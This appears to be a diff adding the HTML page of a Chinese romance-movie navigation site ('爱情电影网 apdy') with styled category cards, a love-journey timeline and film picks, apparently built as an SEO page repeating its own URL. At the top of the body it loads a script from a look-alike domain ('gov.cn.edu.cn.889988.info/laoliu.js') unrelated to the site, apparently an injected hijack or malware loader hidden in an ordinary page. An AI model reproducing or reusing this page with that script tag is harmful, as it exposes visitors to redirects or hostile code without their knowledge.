@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>爱情电影网 apdy - 浪漫爱情电影在线观看</title>
+<meta name="description" content="爱情电影网 apdy（aiqingdianyingwangapdy-h5）专注浪漫爱情电影，提供甜宠、虐恋、青春、婚姻等高清影视在线观看。官方网址：https://aiqingdianyingwangapdy-h5.github.io">
+<meta name="keywords" content="爱情电影网 apdy, aiqingdianyingwangapdy-h5, 爱情片, 浪漫电影, 甜宠, 虐恋, 在线电影">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",sans-serif;
+  background:#0c0015;
+  color:#f0e6f0;
+  line-height:1.8;
+  overflow-x:hidden;
+}
+
+/* ===== 顶部导航 ===== */
+.love-nav{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 24px;
+  background:rgba(12,0,21,.85);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid rgba(255,100,180,.2);
+}
+.love-nav .logo{
+  font-size:20px;font-weight:900;letter-spacing:1px;
+  background:linear-gradient(135deg,#ff6ec4,#ffb3ec);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.love-nav .nav-links{display:flex;gap:8px;flex-wrap:wrap}
+.love-nav .nav-links a{
+  font-size:13px;padding:8px 16px;border-radius:20px;transition:.3s;color:#d4a5c8;
+}
+.love-nav .nav-links a:hover{background:rgba(255,110,196,.15);color:#ff6ec4}
+
+/* ===== Hero 心形粒子 ===== */
+.love-hero{
+  min-height:100vh;
+  display:flex;flex-direction:column;justify-content:center;align-items:center;
+  text-align:center;padding:100px 20px 60px;
+  background:
+    radial-gradient(ellipse at 30% 20%, rgba(255,110,196,.25), transparent 50%),
+    radial-gradient(ellipse at 70% 80%, rgba(120,80,255,.2), transparent 50%),
+    #0c0015;
+  position:relative;
+}
+.love-hero::before{
+  content:"💕";font-size:80px;position:absolute;top:15%;left:10%;opacity:.15;animation:float 4s ease-in-out infinite;
+}
+.love-hero::after{
+  content:"💖";font-size:60px;position:absolute;bottom:20%;right:12%;opacity:.12;animation:float 5s ease-in-out infinite reverse;
+}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}
+.love-hero h1{
+  font-size:48px;font-weight:900;margin-bottom:16px;
+  background:linear-gradient(135deg,#ff6ec4,#ffb3ec,#c8a8ff);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.love-hero .subtitle{font-size:18px;color:#c8a0c0;margin-bottom:14px;max-width:520px}
+.love-hero .url-pill{
+  display:inline-block;margin-top:20px;
+  background:rgba(255,110,196,.1);border:1px solid rgba(255,110,196,.3);
+  color:#ffb3ec;padding:10px 24px;border-radius:30px;font-size:14px;letter-spacing:1px;
+}
+
+/* ===== 通用 ===== */
+.wrap{max-width:1100px;margin:0 auto;padding:80px 20px}
+.sec-title{
+  font-size:26px;font-weight:900;margin-bottom:40px;text-align:center;color:#fff;
+}
+.sec-title span{color:#ff6ec4}
+.sec-sub{text-align:center;font-size:13px;color:#a080a0;letter-spacing:2px;margin-bottom:36px}
+
+/* ===== 栏目一：爱情分类（翻转卡片） ===== */
+.flip-grid{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:22px;
+}
+.flip-card{
+  perspective:1000px;height:180px;
+}
+.flip-inner{
+  position:relative;width:100%;height:100%;
+  transition:transform .6s;transform-style:preserve-3d;
+}
+.flip-card:hover .flip-inner{transform:rotateY(180deg)}
+.flip-front,.flip-back{
+  position:absolute;width:100%;height:100%;backface-visibility:hidden;
+  border-radius:16px;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center;
+}
+.flip-front{
+  background:linear-gradient(145deg,rgba(255,110,196,.15),rgba(120,80,255,.1));
+  border:1px solid rgba(255,110,196,.25);
+}
+.flip-front .icon{font-size:36px;margin-bottom:10px}
+.flip-front h3{font-size:17px;color:#ffb3ec}
+.flip-back{
+  background:linear-gradient(145deg,#ff6ec4,#c84ec4);
+  transform:rotateY(180deg);
+}
+.flip-back p{font-size:13px;color:#fff;line-height:1.6}
+
+/* ===== 栏目二：热恋进度条时间线 ===== */
+.love-progress{
+  max-width:700px;margin:0 auto;
+}
+.progress-step{
+  display:flex;align-items:center;gap:20px;margin-bottom:28px;
+}
+.progress-step:nth-child(even){flex-direction:row-reverse}
+.progress-bar-wrap{
+  flex:1;height:10px;background:rgba(255,110,196,.1);border-radius:10px;overflow:hidden;
+}
+.progress-fill{
+  height:100%;border-radius:10px;
+  background:linear-gradient(90deg,#ff6ec4,#c8a8ff);
+  animation:fillAnim 2s ease-out forwards;
+}
+@keyframes fillAnim{from{width:0}to{width:var(--w)}}
+.progress-step .step-info{
+  flex:0 0 200px;background:rgba(255,110,196,.08);border:1px solid rgba(255,110,196,.2);
+  border-radius:12px;padding:14px 18px;
+}
+.progress-step:nth-child(even) .step-info{text-align:right}
+.step-info h4{font-size:15px;color:#ffb3ec;margin-bottom:4px}
+.step-info p{font-size:12px;color:#a080a0}
+
+/* ===== 栏目三：推荐影片（渐变边框卡片） ===== */
+.grad-cards{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:24px;
+}
+.grad-card{
+  position:relative;border-radius:16px;padding:2px;
+  background:linear-gradient(135deg,#ff6ec4,#c8a8ff,#6e8cff);
+}
+.grad-card::before{
+  content:"";position:absolute;inset:0;border-radius:16px;
+  background:linear-gradient(135deg,#ff6ec4,#c8a8ff,#6e8cff);
+  opacity:.6;z-index:0;
+}
+.grad-inner{
+  position:relative;z-index:1;background:#14002a;border-radius:14px;padding:26px 22px;height:100%;
+}
+.grad-inner .emoji{font-size:36px;margin-bottom:12px}
+.grad-inner h4{font-size:17px;color:#fff;margin-bottom:8px}
+.grad-inner p{font-size:13px;color:#c8a0c0;margin-bottom:14px}
+.grad-inner .tags{display:flex;gap:8px;flex-wrap:wrap}
+.grad-inner .tag{
+  font-size:11px;padding:3px 10px;border-radius:10px;
+  background:rgba(255,110,196,.12);color:#ffb3ec;border:1px solid rgba(255,110,196,.2);
+}
+
+/* ===== 栏目四：关于 ===== */
+.about-love{
+  background:linear-gradient(135deg,rgba(255,110,196,.08),rgba(120,80,255,.08));
+  border:1px solid rgba(255,110,196,.2);border-radius:20px;padding:44px 36px;text-align:center;
+}
+.about-love h2{font-size:24px;color:#ffb3ec;margin-bottom:16px}
+.about-love p{font-size:15px;color:#c8a0c0;max-width:640px;margin:0 auto 12px}
+.about-love .stats{display:flex;justify-content:center;gap:40px;margin-top:30px;flex-wrap:wrap}
+.about-love .stat .num{font-size:32px;font-weight:900;background:linear-gradient(135deg,#ff6ec4,#c8a8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.about-love .stat .lbl{font-size:12px;color:#a080a0;margin-top:4px}
+
+/* ===== 底部 ===== */
+.love-footer{
+  text-align:center;padding:40px 20px;background:#080010;color:#6a5070;font-size:13px;border-top:1px solid rgba(255,110,196,.1);
+}
+.love-footer a{color:#ff6ec4}
+.love-footer .heart{animation:beat 1s infinite}
+@keyframes beat{0%,100%{transform:scale(1)}50%{transform:scale(1.2)}}
+
+/* ===== 响应式 ===== */
+@media(max-width:768px){
+  .love-hero h1{font-size:32px}
+  .love-nav .nav-links a{font-size:12px;padding:6px 10px}
+  .progress-step,.progress-step:nth-child(even){flex-direction:column;gap:10px}
+  .progress-step .step-info{flex:none;width:100%;text-align:center!important}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 导航 -->
+<nav class="love-nav">
+  <div class="logo">爱情电影网 apdy</div>
+  <div class="nav-links">
+    <a href="#home">首页</a>
+    <a href="#category">爱情分类</a>
+    <a href="#journey">恋爱旅程</a>
+    <a href="#recommend">精选推荐</a>
+    <a href="#about">关于我们</a>
+  </div>
+</nav>
+
+<!-- Hero -->
+<section id="home" class="love-hero">
+  <h1>爱情电影网 <span style="color:#ff6ec4">apdy</span></h1>
+  <p class="subtitle">每一帧都是心动，每一部都是关于爱的故事</p>
+  <p style="color:#a080a0;font-size:14px">甜宠 · 虐恋 · 青春 · 婚姻 · 治愈</p>
+  <span class="url-pill">🌐 https://aiqingdianyingwangapdy-h5.github.io</span>
+</section>
+
+<!-- 栏目一：爱情分类（翻转卡片） -->
+<section id="category" class="wrap">
+  <h2 class="sec-title">爱情 <span>分类</span></h2>
+  <p class="sec-sub">CATEGORIES · 每一种爱都有它的模样</p>
+  <div class="flip-grid">
+    <div class="flip-card">
+      <div class="flip-inner">
+        <div class="flip-front"><div class="icon">🍬</div><h3>甜宠爱情</h3></div>
+        <div class="flip-back"><p>高糖预警！校园甜恋、霸总宠溺、欢喜冤家，全程姨母笑</p></div>
+      </div>
+    </div>
+    <div class="flip-card">
+      <div class="flip-inner">
+        <div class="flip-front"><div class="icon">💔</div><h3>虐恋情深</h3></div>
+        <div class="flip-back"><p>BE美学巅峰，虐身虐心，看完需要一包纸巾</p></div>
+      </div>
+    </div>
+    <div class="flip-card">
+      <div class="flip-inner">
+        <div class="flip-front"><div class="icon">🌸</div><h3>青春校园</h3></div>
+        <div class="flip-back"><p>校服到婚纱、初恋的酸涩、同桌的你，青春永不散场</p></div>
+      </div>
+    </div>
+    <div class="flip-card">
+      <div class="flip-inner">
+        <div class="flip-front"><div class="icon">💍</div><h3>婚姻生活</h3></div>
+        <div class="flip-back"><p>从热恋到柴米油盐，婚姻里的烟火气与深情</p></div>
+      </div>
+    </div>
+    <div class="flip-card">
+      <div class="flip-inner">
+        <div class="flip-front"><div class="icon">🏳️‍🌈</div><h3>同性之爱</h3></div>
+        <div class="flip-back"><p>跨越性别的爱，同样纯粹而动人</p></div>
+      </div>
+    </div>
+    <div class="flip-card">
+      <div class="flip-inner">
+        <div class="flip-front"><div class="icon">✨</div><h3>奇幻爱情</h3></div>
+        <div class="flip-back"><p>穿越时空、人鬼情缘、前世今生，爱能超越一切</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：恋爱旅程（进度条时间线） -->
+<section id="journey" class="wrap">
+  <h2 class="sec-title">恋爱 <span>旅程</span></h2>
+  <p class="sec-sub">JOURNEY · 从心动到白首的每一步</p>
+  <div class="love-progress">
+    <div class="progress-step">
+      <div class="progress-bar-wrap"><div class="progress-fill" style="--w:100%"></div></div>
+      <div class="step-info">
+        <h4>💘 初见心动</h4>
+        <p>那一眼，世界安静了</p>
+      </div>
+    </div>
+    <div class="progress-step">
+      <div class="progress-bar-wrap"><div class="progress-fill" style="--w:85%"></div></div>
+      <div class="step-info">
+        <h4>💬 暧昧试探</h4>
+        <p>每一句话都藏着小心思</p>
+      </div>
+    </div>
+    <div class="progress-step">
+      <div class="progress-bar-wrap"><div class="progress-fill" style="--w:95%"></div></div>
+      <div class="step-info">
+        <h4>💑 确认关系</h4>
+        <p>从此余生皆是你</p>
+      </div>
+    </div>
+    <div class="progress-step">
+      <div class="progress-bar-wrap"><div class="progress-fill" style="--w:70%"></div></div>
+      <div class="step-info">
+        <h4>🌊 磨合争吵</h4>
+        <p>爱不是不吵架，是吵完还想在一起</p>
+      </div>
+    </div>
+    <div class="progress-step">
+      <div class="progress-bar-wrap"><div class="progress-fill" style="--w:100%"></div></div>
+      <div class="step-info">
+        <h4>♾️ 相守一生</h4>
+        <p>执子之手，与子偕老</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：精选推荐（渐变边框卡片） -->
+<section id="recommend" class="wrap">
+  <h2 class="sec-title">精选 <span>推荐</span></h2>
+  <p class="sec-sub">FEATURED · 影史最动人的爱情故事</p>
+  <div class="grad-cards">
+    <div class="grad-card">
+      <div class="grad-inner">
+        <div class="emoji">📖</div>
+        <h4>傲慢与偏见</h4>
+        <p>跨越阶级与偏见的经典爱情，达西先生的告白至今让人心动</p>
+        <div class="tags"><span class="tag">经典</span><span class="tag">名著改编</span><span class="tag">9.2分</span></div>
+      </div>
+    </div>
+    <div class="grad-card">
+      <div class="grad-inner">
+        <div class="emoji">⏳</div>
+        <h4>时空恋旅人</h4>
+        <p>穿越时间只为多爱你一天，温暖治愈到哭</p>
+        <div class="tags"><span class="tag">治愈</span><span class="tag">奇幻</span><span class="tag">8.8分</span></div>
+      </div>
+    </div>
+    <div class="grad-card">
+      <div class="grad-inner">
+        <div class="emoji">🎪</div>
+        <h4>大鱼</h4>
+        <p>用一生编织浪漫故事的父亲，爱是让平凡变成传奇</p>
+        <div class="tags"><span class="tag">温情</span><span class="tag">奇幻</span><span class="tag">8.7分</span></div>
+      </div>
+    </div>
+    <div class="grad-card">
+      <div class="grad-inner">
+        <div class="emoji">🌊</div>
+        <h4>泰坦尼克号</h4>
+        <p>你跳我也跳，冰海沉船也沉不了的爱</p>
+        <div class="tags"><span class="tag">灾难</span><span class="tag">史诗</span><span class="tag">9.5分</span></div>
+      </div>
+    </div>
+    <div class="grad-card">
+      <div class="grad-inner">
+        <div class="emoji">📮</div>
+        <h4>情书</h4>
+        <p>你好吗？我很好。一封寄往天国的信</p>
+        <div class="tags"><span class="tag">暗恋</span><span class="tag">纯爱</span><span class="tag">8.9分</span></div>
+      </div>
+    </div>
+    <div class="grad-card">
+      <div class="grad-inner">
+        <div class="emoji">🌙</div>
+        <h4>爱在黎明破晓前</h4>
+        <p>维也纳的偶遇，一整夜的对话，一生的羁绊</p>
+        <div class="tags"><span class="tag">文艺</span><span class="tag">话痨</span><span class="tag">9.1分</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：关于 -->
+<section id="about" class="wrap">
+  <div class="about-love">
+    <h2>关于爱情电影网 apdy</h2>
+    <p>爱情电影网 apdy（aiqingdianyingwangapdy-h5）是一个专注爱情题材的影视导航站点。我们相信，爱情是世界上最美好的情感，而电影是记录爱情最好的方式。</p>
+    <p>从甜宠到虐恋，从青春到婚姻，从初见到白首——这里收录每一种爱的模样。</p>
+    <div class="stats">
+      <div class="stat"><div class="num">6</div><div class="lbl">爱情分类</div></div>
+      <div class="stat"><div class="num">∞</div><div class="lbl">心动瞬间</div></div>
+      <div class="stat"><div class="num">100%</div><div class="lbl">浪漫指数</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 底部 -->
+<footer class="love-footer">
+  <p><span class="heart">💕</span> 爱情电影网 apdy <span class="heart">💕</span></p>
+  <p>官方网址：<a href="https://aiqingdianyingwangapdy-h5.github.io">https://aiqingdianyingwangapdy-h5.github.io</a></p>
+  <p>© 2026 爱情电影网 apdy | 每一帧都是心动</p>
+</footer>
+
+</body>
+</html>
